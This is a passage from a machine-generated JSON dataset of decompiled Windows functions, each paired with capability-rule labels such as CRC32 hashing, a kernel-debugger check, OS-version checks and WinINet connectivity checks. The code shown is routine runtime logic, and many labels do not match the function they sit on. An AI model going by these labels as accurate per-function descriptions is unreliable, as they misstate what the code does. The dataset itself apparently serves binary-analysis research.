            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00475a0f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a4ef0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00459260();\n        *puVar2 = 0;\n        puVar2 = fcn.0045924d();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4af068)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4af080;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x28;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0047a344(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0045924d();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00459260();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00475449(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00475ae1(0x4a4ef0);\n                goto code_r0x00475adb;\n            }\n        }\n        puVar2 = fcn.00459260();\n        *puVar2 = 0;\n        puVar2 = fcn.0045924d();\n        *puVar2 = 9;\n        fcn.004577e9(0, 0, 0, 0, 0);\n    }\ncode_r0x00475adb:\n    fcn.004594a5();\n    return;\n}\n",
        "token_count": 630
    },
    "00476082": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00476082(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = fcn.0045fb06();\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    if (*0x4adfa0 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x4947d4),  iVar2 == 0)) {\n            return 0;\n        }\n        *0x4adfa0 = fcn.0045faa3(iVar2);\n        uVar3 = (*pcVar4)(iVar1, 0x4947c4);\n        *0x4adfa4 = fcn.0045faa3(uVar3);\n        uVar3 = (*pcVar4)(iVar1, 0x4947b0);\n        *0x4adfa8 = fcn.0045faa3(uVar3);\n        iVar2 = fcn.0045c40e(&var_8h);\n        if (iVar2 != 0) {\n            fcn.004576b5(0, 0, 0, 0, 0);\n        }\n        if (var_8h == 2) {\n            uVar3 = (*pcVar4)(iVar1, \"GetUserObjectInformationA\");\n            *0x4adfb0 = fcn.0045faa3(uVar3);\n            if (*0x4adfb0 != 0) {\n                uVar3 = (*pcVar4)(iVar1, \"GetProcessWindowStation\");\n                *0x4adfac = fcn.0045faa3(uVar3);\n            }\n        }\n    }\n    iVar1 = var_10h;\n    if ((*0x4adfac == var_10h) || (*0x4adfb0 == var_10h)) {\ncode_r0x004761d0:\n        if (*0x4adfa4 != iVar1) {\n            pcVar4 = fcn.0045fb0f(*0x4adfa4);\n            var_4h = (*pcVar4)();\n            if ((var_4h != 0) && (*0x4adfa8 != iVar1)) {\n                pcVar4 = fcn.0045fb0f(*0x4adfa8, var_4h);\n                var_4h = (*pcVar4)();\n            }\n        }\n    }\n    else {\n        pcVar4 = fcn.0045fb0f(*0x4adfac);\n        iVar2 = (*pcVar4)();\n        if (iVar2 != 0) {\n            pcVar4 = fcn.0045fb0f(*0x4adfb0, iVar2, 1, &var_20h, 0xc, &var_14h);\n            iVar2 = (*pcVar4)();\n            if ((iVar2 != 0) && ((var_18h & 1) != 0)) goto code_r0x004761d0;\n        }\n        iVar1 = fcn.0045c4bd(&var_ch);\n        if (iVar1 != 0) {\n            fcn.004576b5(0, 0, 0, 0, 0);\n        }\n        if (var_ch < 4) {\n            arg_10h = arg_10h | 0x40000;\n        }\n        else {\n            arg_10h = arg_10h | 0x200000;\n        }\n    }\n    pcVar4 = fcn.0045fb0f(*0x4adfa0, var_4h, arg_8h, arg_ch, arg_10h);\n    uVar3 = (*pcVar4)();\n    return uVar3;\n}\n",
        "token_count": 981
    },
    "00478c7c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00478c7c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.00455f5a(arg_10h);\n    var_14h = fcn.0047d00d(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0047beee(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00478cd3:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00478d13;\n        }\n        if (iVar1 != 2) {\ncode_r0x00478d05:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00478d13;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00478d05;\n        goto code_r0x00478cd3;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00478d13:\n    fcn.004566a8(unaff_EBX);\n    return;\n}\n",
        "token_count": 508
    },
    "00478def": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00478def(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4a9ec8 ^ &stack0xfffffffc;\n    fcn.00455f5a(arg_10h);\n    var_14h = fcn.0047d00d(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0047c430(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00478e46:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00478e86;\n        }\n        if (iVar1 != 2) {\ncode_r0x00478e78:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00478e86;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00478e78;\n        goto code_r0x00478e46;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00478e86:\n    fcn.004566a8(unaff_EBX);\n    return;\n}\n",
        "token_count": 506
    },
    "0047b653": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0047b653(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00459460(0x4a50c0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00459260();\n        *puVar2 = 0;\n        puVar2 = fcn.0045924d();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4af068)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4af080;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x28;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0047a344(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0045924d();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00459260();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0047b0b1(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0047b725(0x4a50c0);\n                goto code_r0x0047b71f;\n            }\n        }\n        puVar2 = fcn.00459260();\n        *puVar2 = 0;\n        puVar2 = fcn.0045924d();\n        *puVar2 = 9;\n        fcn.004577e9(0, 0, 0, 0, 0);\n    }\ncode_r0x0047b71f:\n    fcn.004594a5();\n    return;\n}\n",
        "token_count": 636
    },
    "004016d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016d0(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    \n    iVar4 = *param_1;\n    ppiVar1 = iVar4 + -0x10;\n    piVar3 = *ppiVar1;\n    if (*(iVar4 + -0xc) != 0) {\n        piVar2 = iVar4 + -4;\n        if (*(iVar4 + -4) < 0) {\n            if (*(iVar4 + -8) < 0) {\n                fcn.00401070(0x80070057);\n                iVar4 = extraout_ECX;\n            }\n            *(iVar4 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar4 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar4 = (**(*piVar3 + 0xc))();\n        *param_1 = iVar4 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "00401760": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401760(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBP;\n    int32_t **ppiVar6;\n    \n    iVar5 = *param_1;\n    if (param_2 < *(iVar5 + -0xc)) {\n        param_2 = *(iVar5 + -0xc);\n    }\n    if (1 < *(iVar5 + -4)) {\n        iVar5 = *param_1;\n        iVar2 = *(iVar5 + -0xc);\n        ppiVar6 = iVar5 + -0x10;\n        puVar3 = (**(**ppiVar6 + 0x10))();\n        iVar4 = (***puVar3)(param_2, 1);\n        if (iVar4 == 0) {\n            fcn.00401430();\n        }\n        if (iVar2 < param_2) {\n            param_2 = iVar2;\n        }\n        fcn.00456177(iVar4 + 0x10, param_2 + 1, iVar5, param_2 + 1);\n        *(iVar4 + 4) = iVar2;\n        piVar1 = iVar5 + -4;\n        LOCK();\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar6 + 4))(ppiVar6);\n        }\n        *unaff_EBP = iVar4 + 0x10;\n        return;\n    }\n    iVar5 = *(iVar5 + -8);\n    if (param_2 <= iVar5) {\n        return;\n    }\n    if (iVar5 < 0x401) {\n        iVar5 = iVar5 * 2;\n    }\n    else {\n        iVar5 = iVar5 + 0x400;\n    }\n    if (iVar5 < param_2) {\n        iVar5 = param_2;\n    }\n    iVar2 = *param_1;\n    if ((*(iVar2 + -8) < iVar5) && (0 < iVar5)) {\n        iVar5 = (**(**(iVar2 + -0x10) + 8))(iVar2 + -0x10, iVar5, 1);\n        if (iVar5 != 0) goto code_r0x004014ee;\n    }\n    iVar5 = fcn.00401430();\ncode_r0x004014ee:\n    *param_1 = iVar5 + 0x10;\n    return;\n}\n",
        "token_count": 594
    },
    "004017b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t ** fcn.004017b0(int32_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    piVar2 = (**(**param_1 + 0x10))();\n    if ((-1 < param_1[3]) && (piVar2 == *param_1)) {\n        LOCK();\n        param_1[3] = param_1[3] + 1;\n        return param_1;\n    }\n    ppiVar3 = (***piVar2)(param_1[1], 1);\n    if (ppiVar3 == NULL) {\n        fcn.00401070(0x8007000e);\n        pcVar1 = swi(3);\n        ppiVar3 = (*pcVar1)();\n        return ppiVar3;\n    }\n    ppiVar3[1] = param_1[1];\n    fcn.00456177(ppiVar3 + 4, param_1[1] + 1, param_1 + 4, param_1[1] + 1);\n    return ppiVar3;\n}\n",
        "token_count": 257
    },
    "00401e30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401e30(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t arg_10h;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t arg_ch;\n    int32_t **ppiVar5;\n    int32_t **in_FS_OFFSET;\n    uint unaff_retaddr;\n    int32_t *piStack40;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x481cb8;\n    piStack12 = *in_FS_OFFSET;\n    uVar3 = *0x4a9ec8 ^ &stack0xffffffc8;\n    *in_FS_OFFSET = &piStack12;\n    fcn.00423bcd(10, uVar3);\n    uStack8 = 0;\n    fcn.00412680(unaff_retaddr, 0x489c44, &stack0xffffffd4);\n    if (piStack40 != NULL) {\n        do {\n            if (piStack40 == NULL) {\n                fcn.0041901a();\ncode_r0x00401f60:\n                fcn.00401430();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            arg_10h = piStack40[2];\n            piStack40 = *piStack40;\n            ppiVar5 = arg_10h + -0x10;\n            piVar4 = (**(**(arg_10h + -0x10) + 0x10))();\n            if ((*(arg_10h + -4) < 0) || (piVar4 != *ppiVar5)) {\n                ppiVar5 = (***piVar4)(*(arg_10h + -0xc), 1);\n                if (ppiVar5 == NULL) goto code_r0x00401f60;\n                ppiVar5[1] = *(arg_10h + -0xc);\n                arg_ch = *(arg_10h + -0xc) + 1;\n                fcn.00456177(ppiVar5 + 4, arg_ch, arg_10h, arg_ch);\n            }\n            else {\n                LOCK();\n                *(arg_10h + -4) = *(arg_10h + -4) + 1;\n            }\n            (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x143, 0, ppiVar5 + 4);\n            ppiVar1 = ppiVar5 + 3;\n            LOCK();\n            piVar4 = *ppiVar1;\n            *ppiVar1 = *ppiVar1 + -1;\n            if (piVar4 == 0x1 || piVar4 + -1 < 0) {\n                (**(**ppiVar5 + 4))(ppiVar5);\n            }\n        } while (piStack40 != NULL);\n    }\n    uStack8 = 0xffffffff;\n    fcn.00423d24();\n    *in_FS_OFFSET = piStack16;\n    return;\n}\n",
        "token_count": 707
    },
    "00401f70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401f70(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t arg_10h;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t arg_ch;\n    uint uVar5;\n    int32_t **ppiVar6;\n    int32_t **in_FS_OFFSET;\n    uint unaff_retaddr;\n    int32_t *piStack40;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x481ce8;\n    piStack12 = *in_FS_OFFSET;\n    uVar3 = *0x4a9ec8 ^ &stack0xffffffc8;\n    *in_FS_OFFSET = &piStack12;\n    fcn.00423bcd(10, uVar3);\n    uStack8 = 0;\n    fcn.00412680(unaff_retaddr, 0x489c44, &stack0xffffffd4);\n    if (piStack40 != NULL) {\n        do {\n            if (piStack40 == NULL) {\n                fcn.0041901a();\ncode_r0x004020aa:\n                fcn.00401430();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            arg_10h = piStack40[2];\n            piStack40 = *piStack40;\n            ppiVar6 = arg_10h + -0x10;\n            piVar4 = (**(**(arg_10h + -0x10) + 0x10))();\n            if ((*(arg_10h + -4) < 0) || (piVar4 != *ppiVar6)) {\n                ppiVar6 = (***piVar4)(*(arg_10h + -0xc), 1);\n                if (ppiVar6 == NULL) goto code_r0x004020aa;\n                ppiVar6[1] = *(arg_10h + -0xc);\n                arg_ch = *(arg_10h + -0xc) + 1;\n                fcn.00456177(ppiVar6 + 4, arg_ch, arg_10h, arg_ch);\n            }\n            else {\n                LOCK();\n                *(arg_10h + -4) = *(arg_10h + -4) + 1;\n            }\n            uVar5 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x14c, 0, ppiVar6 + 4);\n            fcn.004015f0(uVar5, 1);\n            ppiVar1 = ppiVar6 + 3;\n            LOCK();\n            piVar4 = *ppiVar1;\n            *ppiVar1 = *ppiVar1 + -1;\n            if (piVar4 == 0x1 || piVar4 + -1 < 0) {\n                (**(**ppiVar6 + 4))(ppiVar6);\n            }\n        } while (piStack40 != NULL);\n    }\n    uStack8 = 0xffffffff;\n    fcn.00423d24();\n    *in_FS_OFFSET = piStack16;\n    return;\n}\n",
        "token_count": 731
    },
    "00402200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00402200(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    \n    iVar3 = *param_2;\n    iVar4 = *param_1;\n    ppiVar1 = iVar3 + -0x10;\n    ppiVar5 = iVar4 + -0x10;\n    if (ppiVar1 == ppiVar5) {\n        return param_1;\n    }\n    piVar2 = iVar4 + -4;\n    if ((-1 < *(iVar4 + -4)) && (*ppiVar1 == *ppiVar5)) {\n        iVar4 = fcn.004017b0(ppiVar1);\n        LOCK();\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar3 == 1 || iVar3 + -1 < 0) {\n            (**(**ppiVar5 + 4))(ppiVar5);\n        }\n        *param_1 = iVar4 + 0x10;\n        return param_1;\n    }\n    fcn.00401d80(iVar3, *(iVar3 + -0xc));\n    return param_1;\n}\n",
        "token_count": 301
    },
    "00402520": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402520(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t **ppiVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t **in_FS_OFFSET;\n    uint uVar9;\n    uint uStack24;\n    int32_t *piStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x481d68;\n    piStack12 = *in_FS_OFFSET;\n    uVar3 = *0x4a9ec8 ^ &stack0xffffffd8;\n    *in_FS_OFFSET = &piStack12;\n    if (*(param_1 + 0x5c) == 0) {\n        piVar4 = fcn.00423280(uVar3);\n        if (piVar4 != NULL) goto code_r0x0040256c;\ncode_r0x00402562:\n        uVar3 = 0x80004005;\n        piVar4 = fcn.00401070();\ncode_r0x0040256c:\n        uStack24 = (**(*piVar4 + 0xc))(uVar3);\n        uStack24 = uStack24 + 0x10;\n        uVar9 = 0;\n        uStack4 = 0;\n        iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x146, 0, 0);\n        piVar4 = fcn.00423280();\n        if (piVar4 == NULL) {\n            piVar4 = fcn.00401070(0x80004005);\n        }\n        ppiVar6 = (**(*piVar4 + 0xc))();\n        if (ppiVar6[1] == NULL) {\n            puVar7 = &uStack24;\n            uStack24 = CONCAT22(uStack24._2_2_, 0x7c);\n            do {\n                cVar2 = *puVar7;\n                puVar7 = puVar7 + 1;\n            } while (cVar2 != '\\0');\n            fcn.00401d80(uVar9, puVar7 - (&uStack24 + 1));\n        }\n        fcn.004022c0();\n        iVar8 = 0;\n        if (0 < iVar5) {\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x150, iVar8, 0);\n                if (iVar5 != 0) {\n                    piVar4 = fcn.00423280();\n                    if (piVar4 == NULL) goto code_r0x00402562;\n                    (**(*piVar4 + 0xc))();\n                    fcn.004175a4();\n                    if (*(uStack4 - 0xc) != 0) {\n                        fcn.00402180();\n                    }\n                    fcn.00402180();\n                    piVar4 = uStack24 + -4;\n                    LOCK();\n                    iVar5 = *piVar4;\n                    *piVar4 = *piVar4 + -1;\n                    if (iVar5 == 1 || iVar5 + -1 < 0) {\n                        (**(**(uStack24 + -0x10) + 4))(uStack24 + -0x10);\n                    }\n                }\n                iVar8 = iVar8 + 1;\n                if (piStack12 <= iVar8) break;\n            } while( true );\n        }\n        fcn.00402200(&stack0xffffffec);\n        *(param_1 + 0x5c) = 1;\n        uStack4 = uStack4 & 0xffffff00;\n        ppiVar1 = ppiVar6 + 3;\n        LOCK();\n        piVar4 = *ppiVar1;\n        *ppiVar1 = *ppiVar1 + -1;\n        if (piVar4 + -1 < 1) {\n            (**(**ppiVar6 + 4))(ppiVar6);\n        }\n        uStack4 = 0xffffffff;\n        piVar4 = uStack24 + -4;\n        LOCK();\n        iVar5 = *piVar4;\n        *piVar4 = *piVar4 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**(uStack24 + -0x10) + 4))(uStack24 + -0x10);\n        }\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 1041
    },
    "004034a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004034a0(uint *param_1)\n\n{\n    code *pcVar1;\n    uint *apuStack16 [4];\n    \n    if (param_1 == NULL) {\n        apuStack16[0] = NULL;\n    }\n    else {\n        apuStack16[0] = param_1;\n        if (0xffffffff / ZEXT48(param_1) == 0) {\n            apuStack16[0] = &param_1;\n            param_1 = NULL;\n            fcn.004567f2();\n            apuStack16[0] = vtable.std::bad_alloc.0;\n            fcn.00456b8d(apuStack16, 0x49cc60);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    fcn.004170b4();\n    return;\n}\n",
        "token_count": 196
    },
    "0040ed80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040ed80(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + 8);\n    cVar1 = *(iVar2 + 0x2d);\n    while (cVar1 == '\\0') {\n        iVar2 = *(iVar2 + 8);\n        cVar1 = *(iVar2 + 0x2d);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0040eda0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040eda0(int32_t **param_1)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *param_1;\n    cVar1 = *(piVar2 + 0x2d);\n    while (cVar1 == '\\0') {\n        piVar2 = *piVar2;\n        cVar1 = *(piVar2 + 0x2d);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "0040ede0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040ede0(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = *param_2;\n    *param_2 = *(iVar1 + 8);\n    if (*(*(iVar1 + 8) + 0x2d) == '\\0') {\n        *(*(iVar1 + 8) + 4) = param_2;\n    }\n    *(iVar1 + 4) = param_2[1];\n    if (param_2 == *(*(param_1 + 4) + 4)) {\n        *(*(param_1 + 4) + 4) = iVar1;\n        *(iVar1 + 8) = param_2;\n        param_2[1] = iVar1;\n        return;\n    }\n    piVar2 = param_2[1];\n    if (param_2 == piVar2[2]) {\n        piVar2[2] = iVar1;\n        *(iVar1 + 8) = param_2;\n        param_2[1] = iVar1;\n        return;\n    }\n    *piVar2 = iVar1;\n    *(iVar1 + 8) = param_2;\n    param_2[1] = iVar1;\n    return;\n}\n",
        "token_count": 294
    },
    "0040ef10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
